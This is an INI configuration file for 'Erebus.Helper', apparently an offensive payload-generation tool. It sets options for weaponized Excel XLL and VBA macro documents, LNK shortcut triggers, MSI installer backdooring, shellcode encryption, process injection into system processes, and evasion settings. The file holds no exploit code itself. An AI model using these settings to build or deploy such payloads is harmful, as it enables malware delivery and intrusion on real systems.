# Erebus.Helper Configuration
# Windows-specific payload compilation and generation parameters

[Build System]
# Supported compilers for compilation
compilers = MSVC, MinGW, Clang

# MSVC compiler detection paths
msvc_paths =
    C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC
    C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Tools\MSVC
    C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC
    C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\VC\Tools\MSVC
    C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC
    C:\Program Files (x86)\Microsoft Visual Studio\2017\Professional\VC\Tools\MSVC

# MinGW compiler detection paths
mingw_paths =
    C:\mingw64
    C:\mingw32
    C:\msys64\mingw64
    C:\msys64\mingw32

# Compilation timeout (seconds)
compilation_timeout = 300

# Supported architectures
architectures = x64, x86

# Optimization levels
optimization_levels = Ox, O2, O1, Od

# Default optimization
default_optimization = Ox

[XLL Compilation]
# Excel Add-In DLL compilation settings
enabled = true
extension = .xll
output_format = PE64
require_signature = false
base_size_kb = 150

# XLL-specific compiler flags
msvc_flags = /D_WINDOWS /DWIN32 /D_USRDLL /D_WINDLL /W3 /EHsc /LD
mingw_flags = -shared -fPIC -DWIN32 -D_WINDOWS -D_USRDLL -Wall

[LNK Trigger]
# Windows LNK shortcut creation
enabled = true
extension = .lnk
# LNK files can contain command execution through command line parameters
support_arguments = true
support_icon_embedding = true

# Supported LNK icon sources
icon_sources =
    windows_system
    embedded_data
    external_file

# LNK trigger execution methods
execution_methods =
    cmd_execute         # cmd.exe /c command
    powershell_execute  # powershell.exe -Command
    batch_execute       # Direct batch script execution
    vbs_execute         # VBScript execution

[Excel Documents]
# Excel document creation and modification
enabled = true
supported_formats = .xlsm, .xlsx, .xls, .xlam

# VBA macro injection
vba_support = true
vba_encryption_methods = XOR, RC4, AES_ECB, AES_CBC
vba_obfuscation = true

# Execution triggers
vba_triggers = AutoOpen, OnClose, OnSave, OnTime, OnEntry, OnExit

# Loader techniques for VBA shellcode
vba_loader_techniques =
    VirtualAlloc
    EnumLocales
    QueueUserAPC
    ProcessHollowing

# Decoy document support
decoy_support = true
decoy_formats = .pdf, .doc, .xlsx, .jpg, .txt

[MSI Backdooring]
# Windows Installer (MSI) backdooring settings
enabled = true
extension = .msi
default_sequence_number = 6500

# Supported attack vectors for MSI backdooring
attack_types = execute, run-exe, load-dll, dotnet, script
default_attack_type = execute

# MSI custom action configuration
custom_action_prefix = CA_
generate_random_names = true
min_action_name_length = 6
max_action_name_length = 12

# Default execution conditions
default_condition = NOT REMOVE
install_sequence_start = InstallInitialize
install_sequence_end = InstallFinalize

# MSI attack vector details
# execute: Direct command execution via CustomAction (stealthiest)
# run-exe: Binary extracted from Binary table and executed
# load-dll: Load native DLL with custom entry point
# dotnet: Load .NET assembly (auto-detected from payload)
# script: Execute VBScript/JScript code

# Entry point settings for DLL/script attacks
default_dll_entry = DllEntry
default_script_entry = Main

# Payload source detection
detect_dll_type = true
detect_dotnet_assembly = true

# MSI database backup
backup_original = true
backup_suffix = .backup

[Encryption]
# Encryption methods for shellcode
methods = NONE, XOR, RC4, AES_ECB, AES_CBC

# Encryption parameters
xor_keysize = 256
rc4_keysize = 256
aes_keysize = 256
aes_iv_size = 16

# Default encryption
default_encryption = XOR

[Payload]
# Payload type configurations
dll_base_size_kb = 100
exe_base_size_kb = 200
xll_base_size_kb = 150

# Process injection methods
injection_methods =
    CreateThread
    ProcessInject
    EnumLocales
    QueueUserAPC
    ProcessHollowing

# Target processes for injection
target_processes =
    C:\Windows\System32\notepad.exe
    C:\Windows\System32\svchost.exe
    C:\Program Files\Internet Explorer\iexplore.exe
    C:\Windows\System32\explorer.exe

[Output]
# Output file configuration
verify_pe_headers = true
verify_signatures = false
cleanup_temporary_files = true
preserve_source_code = true

# Output logging
log_level = INFO
log_to_file = true
log_file = erebus_helper.log

[Validation]
# Validation settings
validate_source_syntax = true
validate_output_pe = true
validate_dll_exports = true

# Strict validation mode (fail on warnings)
strict_mode = false

[Performance]
# Performance tuning
max_parallel_compilations = 4
enable_caching = true
cache_directory = .cache
cache_ttl_hours = 24

# Optimization strategies
prefer_lto = false  # Link-Time Optimization
strip_symbols = true

[Security]
# Security-related settings
code_signing_enabled = false
authenticode_certificate_path = null

# Evasion techniques
obfuscate_source = true
randomize_strings = true
flatten_control_flow = false
inline_functions = false

# Shellcode encryption
encrypt_shellcode = true
encrypt_key_embedded = false

[Logging]
# Detailed logging configuration
debug_mode = false
verbose_mode = true
log_format = %(asctime)s - %(name)s - %(levelname)s - %(message)s
log_date_format = %Y-%m-%d %H:%M:%S

# Log file rotation
log_max_bytes = 10485760  # 10 MB
log_backup_count = 5

[Compatibility]
# Windows version targeting
min_windows_version = 7
target_windows_version = 10

# Office version support
min_excel_version = 2010
target_excel_version = 2019+

# .NET Framework (if required)
min_dotnet_version = null
target_dotnet_version = null

[Advanced]
# Advanced configuration options
use_native_syscalls = false
use_inline_syscalls = false
detect_sandboxes = false
anti_debugging = false
anti_analysis = false

# Memory protection
use_page_guard = false
use_virtual_protect = false
xor_decrypt_in_place = true

# Additional headers and libraries
additional_includes = null
additional_libraries = null

# Custom compilation flags (per-compiler)
custom_msvc_flags = null
custom_mingw_flags = null
custom_clang_flags = null
